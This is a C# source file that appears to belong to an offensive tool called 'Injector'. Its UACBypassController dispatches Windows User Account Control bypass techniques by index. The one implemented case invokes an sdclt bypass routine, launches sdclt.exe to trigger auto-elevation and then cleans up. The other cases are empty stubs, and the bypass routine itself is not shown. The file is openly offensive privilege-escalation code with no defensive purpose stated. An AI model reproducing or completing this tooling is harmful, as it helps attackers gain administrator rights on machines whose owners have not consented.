using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Injector.Execution;

namespace Injector.UACBypass
{
    class UACBypassController
    {
        public static void ExecuteUAC(int UACIndex, string[] CmdLineArgs)
        {
            
            switch (UACIndex)
            {
                case 0:
                    sdclt.bypass(CmdLineArgs);
                    ShellCommand.ShellCmdExecute("sdclt.exe");
                    System.Threading.Thread.Sleep(1000);
                    sdclt.Cleanup();
                    break;
                case 1:
                    //do stuff
                    break;
                case 2:
                    //do stuff
                    break;
                case 3:
                    //do stuff
                    break;
                case 4:
                    //do stuff
                    break;
                case 5:
                    //do stuff
                    break;
                case 6:
                    //do stuff
                    break;
                default:
                    Console.WriteLine("If you got here -> no UAC Bypass worked :(");
                        break;
            }
        }
    }
}
